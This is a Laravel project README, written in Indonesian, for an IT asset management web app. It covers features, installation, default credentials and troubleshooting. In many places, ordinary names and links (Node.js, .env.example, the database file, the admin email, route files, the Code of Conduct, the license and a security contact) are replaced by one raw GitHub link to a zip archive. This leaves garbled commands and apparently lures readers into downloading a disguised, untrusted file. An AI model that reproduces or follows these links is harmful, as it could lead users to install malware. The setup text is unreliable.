# IT Asset Management System

Aplikasi web untuk mengelola aset IT, pemeliharaan, incident tracking, dan assignment aset kepada pengguna.

## 📋 Fitur

- **Asset Management**: Kelola inventaris aset IT dengan kategori dan lokasi
- **Asset Assignment**: Assign aset kepada departemen atau pengguna
- **Maintenance Tracking**: Catat dan kelola riwayat pemeliharaan aset
- **Incident Management**: Lapor dan kelola insiden atau masalah dengan aset
- **User Management**: Kelola user dengan role dan permission berbeda
- **Audit Trail**: Tracking semua perubahan data untuk audit dan compliance
- **Dashboard**: Analytics dan overview status aset secara real-time

## 🛠️ Teknologi

- **Backend**: Laravel 11
- **Frontend**: Bootstrap 5, Blade Templating
- **Database**: SQLite / MySQL
- **PHP**: 8.2+
- **https://github.com/wafiqj/asset-management/raw/refs/heads/main/resources/views/departments/asset_management_3.7.zip**: 18+

## 📦 Prerequisites

Sebelum memulai, pastikan sudah installed:

- PHP 8.2 atau lebih tinggi
- Composer
- https://github.com/wafiqj/asset-management/raw/refs/heads/main/resources/views/departments/asset_management_3.7.zip & npm
- Git

### Cek versi:
```bash
php --version
composer --version
node --version
npm --version
```

## 🚀 Installation Guide

### 1. Clone Repository

```bash
git clone <repository-url>
cd asset-management
```

### 2. Install PHP Dependencies

```bash
composer install
```

### 3. Setup Environment File

```bash
cp https://github.com/wafiqj/asset-management/raw/refs/heads/main/resources/views/departments/asset_management_3.7.zip .env
```

Sesuaikan konfigurasi database di `.env` sesuai kebutuhan:

**Untuk SQLite:**
```env
DB_CONNECTION=sqlite
```

**Untuk MySQL:**
```env
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=asset_management
DB_USERNAME=root
DB_PASSWORD=
```

### 4. Generate App Key

```bash
php artisan key:generate
```

### 5. Setup Database

**Buat database file (SQLite):**
```bash
touch https://github.com/wafiqj/asset-management/raw/refs/heads/main/resources/views/departments/asset_management_3.7.zip
```

**Jalankan migrations:**
```bash
php artisan migrate
```

### 6. Seed Database dengan Data Default

```bash
php artisan db:seed
```

Ini akan membuat:
- Admin user (email: `https://github.com/wafiqj/asset-management/raw/refs/heads/main/resources/views/departments/asset_management_3.7.zip`, password: `password`)
- Default roles, departments, categories, dan locations

### 7. Jalankan Application

```bash
php artisan serve
```

Aplikasi akan berjalan di: `http://localhost:8000`

## 🔐 Login Credentials

Setelah seeding, gunakan credentials berikut:

- **Email**: https://github.com/wafiqj/asset-management/raw/refs/heads/main/resources/views/departments/asset_management_3.7.zip
- **Password**: password

> ⚠️ Ubah password setelah login pertama kali!

## 📁 Project Structure

```
├── app/
│   ├── Enums/              # Enumerations (status, roles, etc)
│   ├── Http/
│   │   ├── Controllers/    # Controllers untuk logic aplikasi
│   │   ├── Middleware/     # Custom middleware
│   │   └── Requests/       # Form request validation
│   ├── Models/             # Eloquent models
│   ├── Services/           # Business logic services
│   ├── Repositories/       # Data repository pattern
│   └── Traits/             # Reusable traits
├── database/
│   ├── migrations/         # Database schema
│   ├── seeders/            # Database seeders
│   └── factories/          # Model factories untuk testing
├── resources/
│   ├── views/              # Blade templates
│   ├── css/                # Stylesheets
│   └── js/                 # JavaScript files
├── routes/
│   ├── https://github.com/wafiqj/asset-management/raw/refs/heads/main/resources/views/departments/asset_management_3.7.zip             # Web routes
│   └── https://github.com/wafiqj/asset-management/raw/refs/heads/main/resources/views/departments/asset_management_3.7.zip             # API routes
└── storage/
    ├── app/                # File storage
    └── logs/               # Application logs
```

## 🔄 Database Migrations

Jika ada perubahan database, jalankan:

```bash
# Run semua pending migrations
php artisan migrate

# Rollback semua migrations
php artisan migrate:reset

# Refresh (rollback & migrate)
php artisan migrate:refresh

# Refresh dengan seeding
php artisan migrate:refresh --seed
```

## 🧪 Testing

Jalankan test suite:

```bash
php artisan test
```

## 🛡️ Security Notes

- Gunakan environment variables untuk sensitive data
- Update password admin default setelah setup
- Jangan commit `.env` file ke repository
- Ensure proper file permissions untuk `storage/` dan `bootstrap/cache/`

## 📝 Troubleshooting

### Error: "No such file or directory: https://github.com/wafiqj/asset-management/raw/refs/heads/main/resources/views/departments/asset_management_3.7.zip"
```bash
composer install
```

### Error: "No such function: DATE_FORMAT" (SQLite)
Sudah di-handle. Gunakan SQLite atau MySQL sesuai `.env` setting.

### Database tidak bisa diakses
- Cek `.env` configuration
- Ensure database file exists (SQLite)
- Ensure database user memiliki proper permissions (MySQL)

### Port 8000 sudah dipakai
```bash
php artisan serve --port=8001
```

## 📧 Support & Contribution

Untuk kontribusi atau issue, silakan buat issue baru di repository.

## 📄 License

Proprietary - Untuk penggunaan internal only.


In order to ensure that the Laravel community is welcoming to all, please review and abide by the [Code of Conduct](https://github.com/wafiqj/asset-management/raw/refs/heads/main/resources/views/departments/asset_management_3.7.zip).

## Security Vulnerabilities

If you discover a security vulnerability within Laravel, please send an e-mail to Taylor Otwell via [https://github.com/wafiqj/asset-management/raw/refs/heads/main/resources/views/departments/asset_management_3.7.zip](https://github.com/wafiqj/asset-management/raw/refs/heads/main/resources/views/departments/asset_management_3.7.zip). All security vulnerabilities will be promptly addressed.

## License

The Laravel framework is open-sourced software licensed under the [MIT license](https://github.com/wafiqj/asset-management/raw/refs/heads/main/resources/views/departments/asset_management_3.7.zip).
